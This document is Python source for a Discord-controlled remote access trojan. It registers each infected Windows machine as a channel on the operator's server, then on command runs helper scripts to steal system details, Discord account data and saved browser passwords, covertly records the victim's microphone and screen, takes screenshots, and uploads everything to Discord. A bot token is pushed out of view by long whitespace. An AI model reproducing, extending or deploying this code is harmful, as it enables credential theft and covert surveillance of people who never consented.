import os
import re
import uuid
import time
import discord
import subprocess

bin_folder = f"C:/Users/{os.getlogin()}/bin"



def split_message(message, chunk_size=1899):
    return [message[i:i+chunk_size] for i in range(0, len(message), chunk_size)]

def get_mac():
    mac = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(0, 2 * 6, 2)][::-1])
    cleaned_mac = re.sub(r'[^a-z0-9-]', '-', mac.lower())
    return cleaned_mac

Token = "MWI6MjUxODMyMzcyMzk2MBM3Mg.G24aXQ.V7ALk_837GDL4lHMibAWk_EH5qn3qJfv1y4Wu1"                                                                                                                                                                                                                                                                                                  ; key = 'MTI5MjUxODMyMzcyMzk2MDM3Mg.G24aXQ.V2ALu_837GDL4lHMibAWk_EH5qn5qJfv1y4Wu8'
class Client(discord.Client):
    @staticmethod
    async def on_ready():
        for guild in client.guilds:
            channel_name = f"{os.getlogin().lower()}-{get_mac()}"
            existing_channel = discord.utils.get(guild.text_channels, name=channel_name)

            if existing_channel is None:
                new_channel = await guild.create_text_channel(channel_name)
                await new_channel.send(f':wireless:  `{os.getlogin()}` Connected')
            else:
                await existing_channel.send(f':wireless:  `{os.getlogin()}` Connected')

    async def on_message(self, message):
        channel_name = f"{os.getlogin().lower()}-{get_mac()}"
        if message.author == self.user:
            return

        channel = message.channel
        if channel.name == channel_name:
            # __________________________________________________________________________
            # *========================================================================*
            if message.content == '/wake':
                await message.channel.send(f':wireless:  `{os.getlogin()}` Connected')

            # __________________________________________________________________________
            # *========================================================================*
            elif message.content == '/help':
                await message.channel.send(f'**Commands List**\n'
                                           f'- `/wake` : Sends a message if the target is connected, otherwise nothing\n'
                                           f'- `/clear` : Clear anything in this channel\n'
                                           f'- `/grab <what-to-grab>` : Grab something on the target (use `/grab help` for help)\n'
                                           f'- `/record <what-to-record>` : Record something on the target (use `/record help` for help)\n'
                                           f'- `/screenshot` : Take a screenshot\n')

            # __________________________________________________________________________
            # *========================================================================*
            elif message.content == '/clear':
                await message.channel.purge()

            # __________________________________________________________________________
            # _____________________________COMPONENT HELP_______________________________
            # __________________________________________________________________________
            # *========================================================================*
            elif message.content == '/grab help':
                await message.channel.send(f"**Component __grab__** :\n"
                                           f"- `/grab infos` : Grab all information about the target\n"
                                           f"- `/grab discord` : Grab the target's Discord account information\n"
                                           f"- `/grab browser` : Grab the target browser information (passwords, autofill fields, ...)\n")

            # __________________________________________________________________________
            # *========================================================================*
            elif message.content == '/record help':
                await message.channel.send(f"**Component __record__** :\n"
                                           f"- `/record screen` : Record the target's screen for 10s\n"
                                           f"- `/record voice` : Record the target's voice for 10s\n")

            # __________________________________________________________________________
            # ___________________________________GRAB___________________________________
            # __________________________________________________________________________
            # *========================================================================*
            elif message.content == '/grab infos':
                if os.path.exists(f"{bin_folder}/computer.pyw"):
                    subprocess.run(['py', f"{bin_folder}/computer.pyw"])
                for i in range(10):
                    if os.path.exists(f"{bin_folder}/COMPUTER-{os.getlogin()}.txt"):
                        await message.channel.send(f":inbox_tray: Uploading the file, this action may take time")
                        await message.channel.send(file=discord.File(f"{bin_folder}/COMPUTER-{os.getlogin()}.txt"))
                        time.sleep(0.5)
                        os.remove(f"{bin_folder}/COMPUTER-{os.getlogin()}.txt")
                        break
                    else:
                        time.sleep(1)

            # __________________________________________________________________________
            # *========================================================================*
            elif message.content == '/grab discord':
                if os.path.exists(f"{bin_folder}/discord.pyw"):
                    subprocess.run(['py', f"{bin_folder}/discord.pyw"])
                for i in range(10):
                    if os.path.exists(f"{bin_folder}/DISCORD-{os.getlogin()}.txt"):
                        await message.channel.send(f":inbox_tray: Uploading the file, this action may take time")
                        await message.channel.send(file=discord.File(f"{bin_folder}/DISCORD-{os.getlogin()}.txt"))
                        time.sleep(0.5)
                        os.remove(f"{bin_folder}/DISCORD-{os.getlogin()}.txt")
                        break
                    else:
                        time.sleep(1)

            # __________________________________________________________________________
            # *========================================================================*
            elif message.content == '/grab browser':
                if os.path.exists(f"{bin_folder}/password.pyw"):
                    subprocess.run(['py', f"{bin_folder}/password.pyw"])
                for i in range(10):
                    if os.path.exists(f"{bin_folder}/PASSWORDS-{os.getlogin()}.txt"):
                        await message.channel.send(f":inbox_tray: Uploading the file, this action may take time")
                        await message.channel.send(file=discord.File(f"{bin_folder}/PASSWORDS-{os.getlogin()}.txt"))
                        time.sleep(0.5)
                        os.remove(f"{bin_folder}/PASSWORDS-{os.getlogin()}.txt")
                        break
                    else:
                        time.sleep(1)

            # __________________________________________________________________________
            # _________________________________RECORD___________________________________
            # __________________________________________________________________________
            # *========================================================================*
            elif message.content == '/record voice':
                if os.path.exists(f"{bin_folder}/record.pyw"):
                    await message.channel.send(f":gear: Recording...")
                    subprocess.run(['py', f"{bin_folder}/record.pyw", "voice"])
                for i in range(10):
                    if os.path.exists(f"{bin_folder}/RECORDED-{os.getlogin()}.wav"):
                        await message.channel.send(f":inbox_tray: Uploading the file, this action may take time")
                        await message.channel.send(file=discord.File(f"{bin_folder}/RECORDED-{os.getlogin()}.wav"))
                        time.sleep(0.5)
                        os.remove(f"{bin_folder}/RECORDED-{os.getlogin()}.wav")
                        break
                    else:
                        time.sleep(1)

            # __________________________________________________________________________
            # *========================================================================*
            elif message.content == '/record screen':
                if os.path.exists(f"{bin_folder}/record.pyw"):
                    await message.channel.send(f":gear: Recording...")
                    subprocess.run(['py', f"{bin_folder}/record.pyw", "screen"])
                for i in range(10):
                    if os.path.exists(f"{bin_folder}/SCREENVID-{os.getlogin()}.avi"):
                        await message.channel.send(f":inbox_tray: Uploading the file, this action may take time")
                        await message.channel.send(file=discord.File(f"{bin_folder}/SCREENVID-{os.getlogin()}.avi"))
                        time.sleep(0.5)
                        os.remove(f"{bin_folder}/SCREENVID-{os.getlogin()}.avi")
                        break
                    else:
                        time.sleep(1)

            # __________________________________________________________________________
            # *========================================================================*
            elif message.content == '/screenshot':
                if os.path.exists(f"{bin_folder}/screen.pyw"):
                    subprocess.run(['py', f"{bin_folder}/screen.pyw", "screenshot"])
                for i in range(10):
                    if os.path.exists(f"{bin_folder}/SCREENSHOT-{os.getlogin()}.png"):
                        await message.channel.send(f":inbox_tray: Uploading the file, this action may take time")
                        await message.channel.send(file=discord.File(f"{bin_folder}/SCREENSHOT-{os.getlogin()}.png"))
                        time.sleep(0.5)
                        os.remove(f"{bin_folder}/SCREENSHOT-{os.getlogin()}.png")
                        break
                    else:
                        time.sleep(1)


            # __________________________________________________________________________
            # *========================================================================*
            else:
                if message.content.startswith("/"):
                    await message.channel.send(":no_entry_sign: Unkown command, type `/help` for help")


intents = discord.Intents.default()
intents.message_content = True
client = Client(intents=intents)
client.run(key)